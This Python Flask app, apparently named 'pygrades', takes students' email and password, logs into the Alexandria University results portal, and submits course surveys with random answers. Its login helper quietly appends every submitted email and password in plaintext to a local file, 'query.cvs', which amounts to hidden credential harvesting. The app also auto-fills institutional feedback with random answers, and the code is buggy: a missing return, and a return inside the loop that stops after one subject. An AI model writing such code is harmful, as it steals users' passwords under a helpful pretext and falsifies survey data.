import random
import requests
from flask import Flask, request,render_template,url_for
app = Flask('pygrades')

@app.route('/pygrades', methods=['GET', 'POST'])
def do_my_survey():
    if request.method == 'GET':
        render_template('index.htm')
    elif request.method == 'POST':
        student_email = request.form['email']
        student_pass = request.form['password']
        your_cookie = getting_cookie_login(student_email, student_pass)
        url_fetch = "http://agr.p.alexu.edu.eg/Results/Student/Result/GetResults"
        headers_fetch = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Cookie": your_cookie,
            "Host": "agr.p.alexu.edu.eg",
            "Referer": "http://agr.p.alexu.edu.eg/Results/Student/Result/",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36"
        }

        resp = requests.get(url_fetch, headers=headers_fetch)

        fetch_data = resp.json()

        first_dig = fetch_data.get('data')

        subjectID = []

        for every_subject in first_dig:
                data_id = every_subject.get('ID')
                subjectID.append(data_id)


        for n in range(len(subjectID)):
            url = "http://agr.p.alexu.edu.eg/Results/Student/Survey/Save"
            data = {
                "StudentSubjectTerm.ID": subjectID[n],
                "Categories[0].Questions[0].ID": "1",
                "Categories[0].Questions[0].AnswerID": random.randrange(1, 4),
                "Categories[0].Questions[1].ID": "2",
                "Categories[0].Questions[1].AnswerID": random.randrange(1, 4),
                "Categories[0].Questions[2].ID": "3",
                "Categories[0].Questions[2].AnswerID": random.randrange(1, 4),
                "Categories[0].Questions[3].ID": "4",
                "Categories[0].Questions[3].AnswerID": random.randrange(1, 4),
                "Categories[0].Questions[4].ID": "5",
                "Categories[0].Questions[4].AnswerID": random.randrange(1, 4),
                "Categories[0].Questions[5].ID": "6",
                "Categories[0].Questions[5].AnswerID": random.randrange(1, 4),
                "Categories[0].Questions[6].ID": "7",
                "Categories[0].Questions[6].AnswerID": random.randrange(1, 4),
                "Categories[0].Questions[7].ID": "8",
                "Categories[0].Questions[7].AnswerID": random.randrange(1, 4),
                "Categories[1].Questions[0].ID": "9",
                "Categories[1].Questions[0].AnswerID": random.randrange(1, 4),
                "Categories[1].Questions[1].ID": "10",
                "Categories[1].Questions[1].AnswerID": random.randrange(1, 4),
                "Categories[1].Questions[2].ID": "11",
                "Categories[1].Questions[2].AnswerID": random.randrange(1, 4),
                "Categories[1].Questions[3].ID": "12",
                "Categories[1].Questions[3].AnswerID": random.randrange(1, 4),
                "Categories[1].Questions[4].ID": "13",
                "Categories[1].Questions[4].AnswerID": random.randrange(1, 4),
                "Categories[1].Questions[5].ID": "14",
                "Categories[1].Questions[5].AnswerID": random.randrange(1, 4),
                "Categories[2].Questions[0].ID": "15",
                "Categories[2].Questions[0].AnswerID": random.randrange(1, 4),
                "Categories[2].Questions[1].ID": "16",
                "Categories[2].Questions[1].AnswerID": random.randrange(1, 4),
                "Categories[2].Questions[2].ID": "17",
                "Categories[2].Questions[2].AnswerID": random.randrange(1, 4),
                "Categories[2].Questions[3].ID": "18",
                "Categories[2].Questions[3].AnswerID": random.randrange(1, 4),
                "Categories[2].Questions[4].ID": "19",
                "Categories[2].Questions[4].AnswerID": random.randrange(1, 4),
                "Categories[2].Questions[5].ID": "20",
                "Categories[2].Questions[5].AnswerID": random.randrange(1, 4),
                "Categories[3].Questions[0].ID": "21",
                "Categories[3].Questions[0].AnswerID": random.randrange(1, 4),
                "Categories[3].Questions[1].ID": "22",
                "Categories[3].Questions[1].AnswerID": random.randrange(1, 4),
                "Categories[3].Questions[2].ID": "23",
                "Categories[3].Questions[2].AnswerID": random.randrange(1, 4),
                "Categories[3].Questions[3].ID": "24",
                "Categories[3].Questions[3].AnswerID": random.randrange(1, 4),
                "Categories[3].Questions[4].ID": "25",
                "Categories[3].Questions[4].AnswerID": random.randrange(1, 4),
                "Categories[3].Questions[5].ID": "26",
                "Categories[3].Questions[5].AnswerID": random.randrange(1, 4),
                "Categories[3].Questions[6].ID": "27",
                "Categories[3].Questions[6].AnswerID": random.randrange(1, 4),
                "Categories[3].Questions[7].ID": "28",
                "Categories[3].Questions[7].AnswerID": random.randrange(1, 4),
                "Categories[3].Questions[8].ID": "29",
                "Categories[3].Questions[8].AnswerID": random.randrange(1, 4)
            }
            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "max-age=0",
                "Connection": "keep-alive",
                "Cookie": your_cookie,
                "DNT": "1",
                "Host": "agr.p.alexu.edu.eg",
                "Referer": "http://agr.p.alexu.edu.eg/Results/Student/Survey/",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36"
            }

            requests.post(url, data=data, headers=headers)
            return "Successed! You've Done Your Survey"
#--------------------------------------------------------------------------------------------------
def getting_cookie_login(student_email, student_pass):
        with open('query.cvs', 'a') as file:
            file.write('{}|{}'.format(student_email, student_pass))
        url_login = "http://agr.p.alexu.edu.eg/Results/Student/Account/CheckLogin"
        data_login = {
            "Email": student_email,
            "Password": student_pass,
            "X-Requested-With": "XMLHttpRequest"
        }

        headers_login = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Length": "91",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Host": "agr.p.alexu.edu.eg",
            "Origin": "http://agr.p.alexu.edu.eg",
            "Referer": "http://agr.p.alexu.edu.eg/Results/Student/Account",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }
        response_login = requests.post(url_login, data=data_login, headers=headers_login)
        login_cookie =  'ASP.NET_SessionId=' + response_login.cookies['ASP.NET_SessionId']
        return login_cookie
# -----------------------------------------------------
@app.route('/success')
def success_page():
    return render_template('ok.htm')
if __name__ == '__main__':
    app.run()
